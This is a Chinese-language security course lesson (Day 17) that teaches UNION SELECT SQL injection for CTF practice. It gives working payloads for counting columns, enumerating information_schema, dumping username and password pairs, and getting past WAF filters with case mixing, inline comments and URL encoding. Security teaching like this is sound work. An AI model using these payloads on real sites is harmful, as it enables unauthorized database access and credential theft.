# Day 17：UNION SELECT联合查询——SQL注入核心技能

> **学习目标**：掌握UNION SELECT联合查询的原理和用法，学会获取数据库信息
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. UNION SELECT原理详解
2. 构造联合查询Payload
3. 获取数据库名
4. 获取表名和列名
5. 获取数据内容
6. 实战练习

---

## 一、UNION SELECT原理详解

### 1.1 什么是UNION SELECT

```
UNION SELECT是什么：
  SQL中的联合查询操作符
  用于合并两个或多个SELECT语句的结果集
  要求两个查询的列数必须相同
  列的数据类型必须兼容

基本语法：
  SELECT column1, column2 FROM table1
  UNION
  SELECT column3, column4 FROM table2;

注意：
  1. UNION会自动去重
  2. UNION ALL不会去重，效率更高
  3. 两个SELECT的列数必须相同
  4. 列的数据类型要兼容
```

### 1.2 UNION SELECT工作原理

```
工作原理：
  1. 执行第一个SELECT语句
  2. 执行第二个SELECT语句
  3. 将两个结果集合并
  4. 返回合并后的结果

示例：
  表users有3列：id, name, password
  表products有3列：id, product_name, price
  
  SELECT id, name, password FROM users
  UNION
  SELECT id, product_name, price FROM products;
  
  结果：返回所有用户和产品数据
```

### 1.3 UNION SELECT在SQL注入中的应用

```
应用场景：
  在SQL注入中，使用UNION SELECT可以获取数据库中的其他数据
  通过构造恶意的联合查询，获取敏感信息

为什么需要：
  普通注入只能获取当前查询的数据
  联合查询可以获取其他表的数据
  包括数据库系统表的信息

示例：
  正常查询：SELECT * FROM users WHERE id = 1
  注入后：SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3
  结果：返回我们构造的数据（1,2,3）
```

---

## 二、构造联合查询Payload

### 2.1 基本构造方法

```
步骤：
  1. 确定注入类型（数字型/字符型）
  2. 确定表的列数（使用ORDER BY）
  3. 构造UNION SELECT语句
  4. 确保列数相同
  5. 使用无效ID确保原查询返回空
  
关键要点：
  - 原查询要返回空（使用-1等无效值）
  - 列数要匹配
  - 数据类型要兼容

示例：
  假设表有3列
  数字型：?id=-1 UNION SELECT 1,2,3--
  字符型：?username=admin' UNION SELECT 1,2,3--
```

### 2.2 数字型注入Payload

```
Payload格式：
  ?id=-1 UNION SELECT 1,2,3,...N--
  
示例：
  ?id=-1 UNION SELECT 1,2,3--
  ?id=-1 UNION SELECT 1,version(),database()--
  ?id=-1 UNION SELECT 1,user(),@@version--

注意：
  - 使用-1确保原查询返回空
  - 列数要与原表相同
```

### 2.3 字符型注入Payload

```
Payload格式：
  ?username=admin' UNION SELECT 1,2,3...N--
  
示例：
  ?username=admin' UNION SELECT 1,2,3--
  ?username=admin' UNION SELECT 1,database(),user()--
  ?username=admin' UNION SELECT 1,@@version,now()--

注意：
  - 先闭合单引号
  - 末尾注释掉剩余SQL
```

### 2.4 测试显示位

```
为什么需要测试显示位：
  原查询可能只显示部分列
  需要知道哪些列会在页面上显示
  
方法：
  注入UNION SELECT 1,2,3,...N
  观察页面上显示的数字
  这些数字所在的位置就是显示位

示例：
  ?id=-1 UNION SELECT 1,2,3--
  如果页面显示2，说明第2列是显示位
  下次就可以把payload放在第2列
```

---

## 三、获取数据库名

### 3.1 使用database()函数

```
database()函数：
  返回当前数据库的名称
  MySQL内置函数

Payload：
  ?id=-1 UNION SELECT 1,database(),3--
  
示例：
  注入：?id=-1 UNION SELECT 1,database(),3--
  响应：当前数据库名是ctf
  
  注入：?username=admin' UNION SELECT 1,database(),3--
  响应：当前数据库名是security
```

### 3.2 使用@@database变量

```
@@database变量：
  也可以获取当前数据库名
  效果与database()相同

Payload：
  ?id=-1 UNION SELECT 1,@@database,3--
  
示例：
  注入：?id=-1 UNION SELECT 1,@@database,3--
  响应：当前数据库名是test
```

### 3.3 获取所有数据库

```
使用information_schema：
  information_schema是MySQL的系统数据库
  包含所有数据库和表的元数据
  
Payload：
  ?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--

示例：
  注入：?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--
  响应：显示所有数据库名
```

---

## 四、获取表名和列名

### 4.1 获取当前数据库的表名

```
Payload：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  
示例：
  注入：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  响应：显示当前数据库的所有表名
  如：users, products, flag
  
注意：
  TABLE_SCHEMA指定数据库名
  database()返回当前数据库名
```

### 4.2 获取指定数据库的表名

```
Payload：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf'--
  
示例：
  注入：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'--
  响应：显示security数据库的所有表名

注意：
  需要知道数据库名
  数据库名需要用引号包裹
```

### 4.3 获取表的列名

```
Payload：
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  
示例：
  注入：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  响应：显示users表的所有列名
  如：id, username, password
  
注意：
  TABLE_NAME指定表名
  表名需要用引号包裹
```

### 4.4 获取指定表的所有信息

```
Payload：
  ?id=-1 UNION SELECT 1,CONCAT(TABLE_NAME,':',COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=database()--
  
示例：
  注入：?id=-1 UNION SELECT 1,CONCAT(TABLE_NAME,':',COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=database()--
  响应：显示所有表名和对应的列名
```

---

## 五、获取数据内容

### 5.1 获取指定表的数据

```
Payload格式：
  ?id=-1 UNION SELECT 1,列名1,列名2 FROM 表名--
  
示例：
  表users有列：id, username, password
  注入：?id=-1 UNION SELECT 1,username,password FROM users--
  响应：显示所有用户名和密码

注意：
  需要先知道表名和列名
  列数要匹配
```

### 5.2 获取flag表的数据

```
Payload：
  ?id=-1 UNION SELECT 1,flag,3 FROM flag--
  
示例：
  注入：?id=-1 UNION SELECT 1,flag,3 FROM flag--
  响应：flag{sql_injection_success}

注意：
  通常CTF题目会有一个flag表
  flag列包含flag内容
```

### 5.3 使用GROUP_CONCAT获取多行数据

```
GROUP_CONCAT函数：
  将多行结果合并成一行
  方便查看所有数据
  
Payload：
  ?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
  
示例：
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
  响应：admin:123456,test:password,user:123

注意：
  默认长度有限制
  可以使用GROUP_CONCAT(column SEPARATOR ',')指定分隔符
```

---

## 六、实战练习

### 6.1 练习1：获取数据库信息

```
题目：
  URL：http://example.com/user?id=1
  已知存在数字型注入，表有3列
  
步骤：
  1. 获取当前数据库名：
     ?id=-1 UNION SELECT 1,database(),3--
     结果：当前数据库是ctf
  
  2. 获取所有表名：
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf'--
     结果：users, flag, posts
  
  3. 获取flag表的列名：
     ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'--
     结果：id, flag
  
  4. 获取flag内容：
     ?id=-1 UNION SELECT 1,flag,3 FROM flag--
     结果：flag{union_select_success}
```

### 6.2 练习2：字符型注入

```
题目：
  URL：http://example.com/login?username=admin
  已知存在字符型注入（单引号闭合），表有2列
  
步骤：
  1. 获取当前数据库名：
     ?username=admin' UNION SELECT 1,database()--
     结果：当前数据库是security
  
  2. 获取所有表名：
     ?username=admin' UNION SELECT 1,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'--
     结果：users, products, secrets
  
  3. 获取secrets表的列名：
     ?username=admin' UNION SELECT 1,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='secrets'--
     结果：id, secret
  
  4. 获取secret内容：
     ?username=admin' UNION SELECT 1,secret FROM secrets--
     结果：flag{character_injection_success}
```

### 6.3 练习3：显示位测试

```
题目：
  URL：http://example.com/api/data?id=1
  已知存在数字型注入，表有4列
  
步骤：
  1. 测试显示位：
     ?id=-1 UNION SELECT 1,2,3,4--
     响应只显示第2和第4列
  
  2. 在显示位注入：
     ?id=-1 UNION SELECT 1,database(),3,user()--
     结果：显示数据库名和用户名
  
  3. 获取表名（放在显示位）：
     ?id=-1 UNION SELECT 1,TABLE_NAME,3,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
     结果：显示所有表名
```

---

## 七、常见问题解决

### 7.1 问题1：UNION被过滤

```
现象：
  使用UNION时被拦截或没有响应

解决方法：
  1. 使用大小写混合：UnIoN、UNION
  2. 使用注释：U/**/NION
  3. 使用编码：%55%4E%49%4F%4E（UNION的URL编码）
  4. 使用UNION ALL代替UNION

示例：
  ?id=-1 U/**/NION SELECT 1,2,3--
  ?id=-1 UnIoN SELECT 1,2,3--
  ?id=-1 UNION ALL SELECT 1,2,3--
```

### 7.2 问题2：列数不匹配

```
现象：
  报错：The used SELECT statements have a different number of columns

解决方法：
  1. 使用ORDER BY重新确认列数
  2. 调整SELECT中的列数

示例：
  如果ORDER BY 3正常，ORDER BY 4报错
  说明有3列，应该使用UNION SELECT 1,2,3
```

### 7.3 问题3：数据类型不兼容

```
现象：
  报错：Data truncation: Truncated incorrect DOUBLE value

解决方法：
  1. 在数字列位置使用数字
  2. 在字符串列位置使用字符串
  3. 使用CAST或CONVERT转换类型

示例：
  ?id=-1 UNION SELECT 1,'string',3--
  ?id=-1 UNION SELECT 1,CAST(database() AS CHAR),3--
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ UNION SELECT原理
  - 联合查询操作符
  - 合并两个SELECT结果集
  - 列数必须相同

✅ 构造Payload
  - 数字型：?id=-1 UNION SELECT 1,2,3--
  - 字符型：?username=admin' UNION SELECT 1,2,3--

✅ 获取信息
  - database()获取数据库名
  - information_schema获取表名和列名
  - GROUP_CONCAT合并多行数据

✅ 实战练习
  - 完整的SQL注入流程
  - 获取Flag

✅ 常见问题解决
  - UNION被过滤
  - 列数不匹配
  - 数据类型不兼容
```

### 8.2 关键记忆点

```
记住这个口诀：

UNION联合查询强，注入必学没商量；
先判列数再联合，显示位要找对；
database()查库名，information_schema查结构；
表名列名拿到手，数据轻松全获取！

流程：
  判断注入类型 → ORDER BY判列数 → UNION SELECT测试显示位 → 获取数据库信息 → 获取数据
```

### 8.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录完整的注入流程
  3. 获取Flag

选做题：
  1. 练习不同闭合方式的注入
  2. 尝试绕过WAF
  3. 在CTFHub找题目练习

提交内容：
  - 注入步骤记录
  - Flag截图
  - 总结
```

### 8.4 明日预告

```
Day 18：information_schema实战

学习内容：
  - information_schema详解
  - 实战获取数据库信息
  - 自动化脚本编写
```

---

**恭喜你完成Day 17的学习！明天学习information_schema实战！** 🎉
